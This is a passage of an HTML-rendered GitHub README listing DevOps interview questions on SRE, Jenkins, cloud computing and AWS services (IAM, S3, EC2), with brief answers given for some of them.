&lt;summary&gt;What SRE team is responsible for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;One can argue whether it's per company definition or a global one but at least according to a large companies, like Google for example, the SRE team is responsible for availability, latency, performance, efficiency, change management, monitoring, emergency response, and capacity planning of their services
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is an error budget?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are MTTF (mean time to failure) and MTTR (mean time to repair)? What these metrics help us to evaluate?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a post-mortem meeting? Why is it important?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is "infrastructure as code"? What implementation of IAC are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you manage build artifacts?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What Continuous Integration solution are you using/prefer and why?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What deployment strategies are you familiar with or have used?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;p&gt;&lt;a name="user-content-devops-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advanced" class="anchor" aria-hidden="true" href="#star-advanced"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Tell me how you perform plan capacity for your CI/CD resources (e.g. servers, storage, etc.)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How would you structure/implement CD for an application which depends on several other applications?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you measure your CI/CD quality? Are there any metrics or KPIs you are using for measuring the quality?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a configuration drift? What problems is it causing?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Configuration drift happens when in an environment of servers with the exact same configuration and software, a certain server
or servers are being applied with updates or configuration which other servers don't get and over time these servers become
slightly different than all others.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;This situation might lead to bugs which hard to identify and reproduce.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to deal with a configuration drift?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Do you have experience with testing cross-projects changes? (aka cross-dependency)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Note: cross-dependency is when you have two or more changes to separate projects and you would like to test them in mutual build instead of testing each change separately.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Have you contributed to an open source project? Tell me about this experience&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-jenkins" class="anchor" aria-hidden="true" href="#jenkins"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Jenkins&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-jenkins-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-1" class="anchor" aria-hidden="true" href="#baby-beginner-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is Jenkins? What have you used it for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are the advantages of Jenkins over its competitors? Can you compare it to one of the following systems?
&lt;ul&gt;
&lt;li&gt;Travis&lt;/li&gt;
&lt;li&gt;Bamboo&lt;/li&gt;
&lt;li&gt;Teamcity&lt;/li&gt;
&lt;li&gt;CircleCI&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What are the limitations or disadvantages of Jenkins?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following:
&lt;ul&gt;
&lt;li&gt;Job&lt;/li&gt;
&lt;li&gt;Build&lt;/li&gt;
&lt;li&gt;Plugin&lt;/li&gt;
&lt;li&gt;Slave&lt;/li&gt;
&lt;li&gt;Executor&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What plugins have you used in Jenkins?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain CI/CD and how you implemented it in Jenkins&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What type of jobs are there? Which types have you used?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How did you report build results to users? What ways are you familiar with for reporting results?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You need to run unit tests every time a change submitted to a given project. Describe in details how your pipeline would look like and what will be executed in each stage&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to secure Jenkins?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you describe some of Jenkins best practices?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Describe how do you add new slaves to Jenkins&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You can describe the UI way to add new slaves but better to explain how to do in a way that scales like a script or using dynamic source for slaves like one of the existing clouds.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;a name="user-content-jenkins-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advanced-1" class="anchor" aria-hidden="true" href="#star-advanced-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How to acquire multiple slaves for one specific build?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;There are four teams in your organization. How to prioritize the builds of each team? So the jobs of team x will always run before team y for example&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;If you are managing a dozen of jobs, you can probably use the Jenkins UI. How do you manage the creation and deletion of hundreds of jobs every week/month?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are some of Jenkins limitations?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Testing cross-dependencies (changes from multiple projects together)&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Starting builds from any stage (although cloudbees implemented something called checkpoints)
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;How would you implement an option of a starting a build from a certain stage and not from the beginning?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-jenkins-dev" class="anchor" aria-hidden="true" href="#jenkins-dev"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Jenkins Dev&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Do you have experience with developing a Jenkins plugin? Can you describe this experience?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Have you written Jenkins scripts? If yes, what for and how they work?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-cloud" class="anchor" aria-hidden="true" href="#cloud"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cloud&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-cloud-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-2" class="anchor" aria-hidden="true" href="#baby-beginner-2"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is Cloud Computing? What is a Cloud Provider?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are the advantages of cloud computing? Mention at least 3 advantages&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Pay as you go (or consumption-based payment) - you are paying only for what you are using. No upfront payments and payment stops when resources are no longer used.&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Scalable - resources are scaled down or up based on demand
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What types of Cloud Computing are there?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;IAAS
PAAS
SAAS
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain each of the following Cloud Computing Deployments:
&lt;ul&gt;
&lt;li&gt;Public&lt;/li&gt;
&lt;li&gt;Hybrid&lt;/li&gt;
&lt;li&gt;Private&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What are the differences between Cloud Providers and On-Premise solution?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;In cloud providers, someone else owns and manages the hardware, hire the relevant infrastructure teams and pays for real-estate (for both hardware and people). You can focus on your business.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;In On-Premise solution, it's quite the opposite. You need to take care of hardware, infrastructure teams and pay for everything which can be quite expensive. On the other hand it's tailored to your needs.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is Serverless Computing?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;The main idea behind serverless computing is that you don't need to manage the creation and configuration of server. All you need to focus on is splitting your app into multiple functions which will be triggered by some actions.&lt;/p&gt;
&lt;p&gt;It's important to note that:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Serverless Computing is still using servers. So saying there are no servers in serverless computing is completely wrong&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Serverless Computing allows you to have different paying model. You basically pay only when your functions are running and not when the VM or containers are running as in other payment models
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;h2&gt;&lt;a id="user-content-aws" class="anchor" aria-hidden="true" href="#aws"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;AWS&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-aws-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-3" class="anchor" aria-hidden="true" href="#baby-beginner-3"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;h4&gt;&lt;a id="user-content-global-infrastructure" class="anchor" aria-hidden="true" href="#global-infrastructure"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Global Infrastructure&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following
&lt;ul&gt;
&lt;li&gt;Availability zone&lt;/li&gt;
&lt;li&gt;Region&lt;/li&gt;
&lt;li&gt;Edge location&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
AWS regions are data centers hosted across different geographical locations worldwide, each region is completely independent of one another.&lt;br&gt;

&lt;p&gt;Within each region, there are multiple isolated locations known as Availability Zones. Multiple availability zones ensure high availability in case one of them goes down.&lt;br&gt;&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Edge locations are basically content delivery network which caches data and insures lower latency and faster delivery to the users in any location. They are located in major cities in the world.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-iam" class="anchor" aria-hidden="true" href="#iam"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;IAM&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is IAM? What are some of its features?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;True or False? IAM configuration is defined globally and not per region&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;True
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What are Roles?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A way for allowing a service of AWS to use another service of AWS. You assign roles to AWS resources.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What are Policies?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Policies documents used to give permissions as to what a user, group or role are able to do. Their format is JSON.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-s3" class="anchor" aria-hidden="true" href="#s3"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;S3&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is S3 and what is it used for&lt;/summary&gt;&lt;br&gt;
&lt;b&gt;
S3 stands for 3 S, Simple Storage Service.
S3 is a object storage service which is fast, scalable and durable. S3 enables customers to upload, download or store any file or object that is up to 5 TB in size. While having a maximum size of 5 GB per file (multipart upload if more than 5 GB in size).
&lt;/b&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a bucket?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
An S3 bucket is a resource which is similar to folders in a file system and allows storing objects, which consist of data and its  meta data.
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;True or False? A bucket name must be globally unique&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
True
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What objects in S3 consists of?
  * Another way to ask it: explain key, value, version id and meta data in context of objects&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain data consistency&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you host dynamic websites on S3?. What about static websites?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What security measures have you taken in context of S3?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a storage class? What storage classes are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-ec2" class="anchor" aria-hidden="true" href="#ec2"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;EC2&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is EC2? What is it used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What EC2 pricing models are there?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to increase RAM for a given EC2 instance?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Stop the instance, the type of the instance to match the desired RAM and start the instance.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is an AMI?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How many storage options are there for EC2 Instances?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What happens when an EC2 instance is stopped or terminated?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are Security Groups?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to migrate an instance to another availability zone?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are spot instances?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
